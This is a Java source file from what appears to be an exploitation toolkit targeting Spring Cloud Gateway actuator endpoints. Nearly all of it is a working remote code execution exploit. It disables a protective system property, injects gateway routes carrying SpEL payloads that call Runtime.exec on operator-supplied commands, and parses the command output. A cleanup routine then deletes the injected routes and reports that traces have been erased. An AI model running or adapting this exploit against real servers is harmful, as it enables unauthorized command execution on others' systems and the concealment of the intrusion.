package src.main.module;

import src.main.common.HTTPConfig;
import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import static src.main.ssl.sslVer.disableSSLVerification;

public class SpringGawRCE_2 {
    public String address;
    public String command;
    public String presetData =
            "{\n" +
                    "  \"predicates\": [\n" +
                    "    {\n" +
                    "      \"name\": \"Path\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/actuators/test\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"filters\": [\n" +
                    "    {\n" +
                    "      \"name\": \"RewritePath\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/test\",\n" +
                    "        \"_genkey_1\": \"#{ @systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = false}\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"uri\": \"http://example.com\",\n" +
                    "\"order\": -1\n" +
                    "}";
    public String pocData =
            "{\n" +
                    "  \"predicates\": [\n" +
                    "    {\n" +
                    "      \"name\": \"Path\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/actuators/test\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"filters\": [\n" +
                    "    {\n" +
                    "      \"name\": \"RewritePath\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/test\",\n" +
                    "        \"_genkey_1\": \"#{ new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())) }\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"uri\": \"http://example.com\",\n" +
                    "\"order\": -1\n" +
                    "}";
    public String expData =
            "{\n" +
                    "  \"predicates\": [\n" +
                    "    {\n" +
                    "      \"name\": \"Path\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/actuators/test\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"filters\": [\n" +
                    "    {\n" +
                    "      \"name\": \"RewritePath\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/test\",\n" +
                    "        \"_genkey_1\": \"#{ new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream())) }\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"uri\": \"http://example.com\",\n" +
                    "\"order\": -1\n" +
                    "}";
    public String[] processCommand(String command) {
        return command.split(" ");
    }
    public String constructExpData(String command) {
        String[] commandArray = processCommand(command);
        String commandString;
        if (commandArray.length == 1) {
            commandString = "'" + commandArray[0] + "'";
        } else {
            commandString = Arrays.stream(commandArray)
                    .map(arg -> "'" + arg + "'")
                    .collect(Collectors.joining(", "));
        }
        return String.format(expData, commandString);
    }
    public SpringGawRCE_2(String address, String command) {
        this.address = address;
        this.command = command;
    }
    public SpringGawRCE_2(String address){
        this.address = address;
    }

    public void GawExp(ResultCallback callback) throws IOException{
        String api = "";
        String data = "";
        String res = "";
        String text = "";
        String refapi = "";
        disableSSLVerification();
        PresetGawValue(callback);
        HttpURLConnection conn = HTTPConfig.createConnection(address + "/actuator/env");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        String responseBody = "";
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()))) {

            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line);
            }
            responseBody = content.toString();
        }
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK
                && responseBody.contains("management.endpoints.web.exposure.include")
                && responseBody.contains("spring.cloud.gateway.restrictive-property-accessor.enabled")){
            if (command == null) {
                api = "/actuator/gateway/routes/poc_test";
                refapi = "/actuator/gateway/refresh";
                data = pocData;
            }else{
                api = "/actuator/gateway/routes/exp_vul";
                refapi = "/actuator/gateway/refresh";
                data = constructExpData(command);
            }
        }else {
            if (command == null) {
                api = "/gateway/routes/poc_test";
                refapi = "/gateway/refresh";
                data = pocData;
            }else{
                api = "/gateway/routes/exp_vul";
                refapi = "/gateway/refresh";
                data = constructExpData(command);
            }
        }
        String site = address + api;
        try {
            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
            conn1.setRequestMethod("POST");
            conn1.setRequestProperty("Content-Type", "application/json");
            conn1.setDoOutput(true);
            try (OutputStream os = conn1.getOutputStream()) {
                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            int responseCode1 = conn1.getResponseCode();
            if (responseCode1 == HttpURLConnection.HTTP_CREATED) {
                String site1 = address + refapi;
                HttpURLConnection conn2 = HTTPConfig.createConnection(site1);
                conn2.setRequestMethod("POST");
                conn2.setDoOutput(true);
                int responseCode2 = conn2.getResponseCode();
                BufferedReader i = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
                String c;
                StringBuilder t = new StringBuilder();
                while ((c = i.readLine()) != null) {
                    t.append(c);
                    res = c;
                }
                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                    HttpURLConnection conn3 = HTTPConfig.createConnection(site);
                    conn3.setRequestMethod("GET");
                    conn3.setDoOutput(true);
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn3.getInputStream()));
                    String inputLine;
                    StringBuilder content = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        content.append(inputLine);
                        res = inputLine;
                    }
                    in.close();
                    int responseCode3 = conn3.getResponseCode();
                    if (responseCode3 == HttpURLConnection.HTTP_OK) {
                        System.out.println(res);
                        if (!res.contains("poc_test")) {
                            String resultPattern = "RewritePath /test = '(.*?)'";
                            Pattern pattern = Pattern.compile(resultPattern);
                            Matcher matcher = pattern.matcher(content.toString());
                            if (matcher.find()) {
                                text = "当前命令回显:\n" + matcher.group(1).replace("\\n", "\n");
                                callback.onResult(text);
                            }
                        } else {
                            if (res.contains("uid=")) {
                                text = address + " " + "存在RCE漏洞!";
                                callback.onResult(text);
                            }
                        }
                    } else {
                        text = "发起请求失败 " + responseCode1;
                        callback.onResult(text);
                    }
                } else{
                    text = "发起请求失败 " + responseCode1;
                    callback.onResult(text);
                }
            }else{
                text = "无法创建gateway路由";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void PresetGawValue(ResultCallback callback) throws IOException{
        String data = presetData;
        String text = "";
        String refapi = "";
        String site = "";
        disableSSLVerification();
        HttpURLConnection conn = HTTPConfig.createConnection(address + "/actuator/env");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            site = address + "/actuator/gateway/routes/pre_set";
            refapi = "/actuator/gateway/refresh";
        } else {
            site = address + "/gateway/routes/pre_set";
            refapi = address + "/gateway/refresh";
        }
        try {
            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
            conn1.setRequestMethod("POST");
            conn1.setRequestProperty("Content-Type", "application/json");
            conn1.setDoOutput(true);
            try (OutputStream os = conn1.getOutputStream()) {
                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            int responseCode1 = conn1.getResponseCode();
            if (responseCode1 == HttpURLConnection.HTTP_CREATED) {
                String site1 = address + refapi;
                HttpURLConnection conn2 = HTTPConfig.createConnection(site1);
                conn2.setRequestMethod("POST");
                conn2.setDoOutput(true);
                int responseCode2 = conn2.getResponseCode();
                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                    text = "spring.cloud.gateway.restrictive-property-accessor.enabled 成功写入";
                    callback.onResult(text);
                } else{
                    text = "访问路由失败 " + responseCode2;
                    callback.onResult(text);
                }
            }else{
                text = "无法创建gateway路由";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }

    public void DelGaw(ResultCallback callback) throws IOException{
        String api = "";
        String api1 = "";
        String api2 = "";
        String expapi = "";
        String text = "";
        String refapi = "";
        disableSSLVerification();
        HttpURLConnection conn = HTTPConfig.createConnection(address + "/actuator/env");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK){
            api = "/actuator/gateway/routes/poc_test";
            refapi = "/actuator/gateway/refresh";
            api1 = "/actuator/gateway/routes/exp_vul";
            api2 = "/actuator/gateway/routes/pre_set";
            expapi = "/actuator/gateway/routes/pwnshell";
        }else {
            api = "/gateway/routes/poc_test";
            refapi = "/gateway/refresh";
            api1 = "/gateway/routes/exp_vul";
            api2 = "/gateway/routes/pre_set";
            expapi = "/gateway/routes/pwnshell";
        }
        String site = address + api;
        String site1 = address + api1;
        String site2 = address + expapi;
        String site3 = address + api2;
        try {
            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
            conn1.setRequestMethod("DELETE");
            conn1.setDoOutput(true);
            int responseCode1 = conn1.getResponseCode();
            HttpURLConnection conn2 = HTTPConfig.createConnection(site1);
            conn2.setRequestMethod("DELETE");
            conn2.setDoOutput(true);
            int responseCode2 = conn2.getResponseCode();
            HttpURLConnection conn3 = HTTPConfig.createConnection(site2);
            conn3.setRequestMethod("DELETE");
            conn3.setDoOutput(true);
            int responseCode3 = conn3.getResponseCode();
            HttpURLConnection conn4 = HTTPConfig.createConnection(site3);
            conn4.setRequestMethod("DELETE");
            conn4.setDoOutput(true);
            int responseCode4 = conn4.getResponseCode();
            if (responseCode1 == HttpURLConnection.HTTP_OK ||
                    responseCode2 == HttpURLConnection.HTTP_OK ||
                    responseCode3 == HttpURLConnection.HTTP_OK ||
                    responseCode4 == HttpURLConnection.HTTP_OK) {
                String refsite = address + refapi;
                HttpURLConnection refconn = HTTPConfig.createConnection(refsite);
                refconn.setRequestMethod("POST");
                refconn.setDoOutput(true);
                int refcode = refconn.getResponseCode();
                if (refcode == HttpURLConnection.HTTP_OK) {
                    text = "痕迹清除成功";
                    callback.onResult(text);
                } else{
                    text = "POST request failed with response code: " + responseCode1;
                    callback.onResult(text);
                }
            }else{
                text = "系统可能不存在默认路由";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}


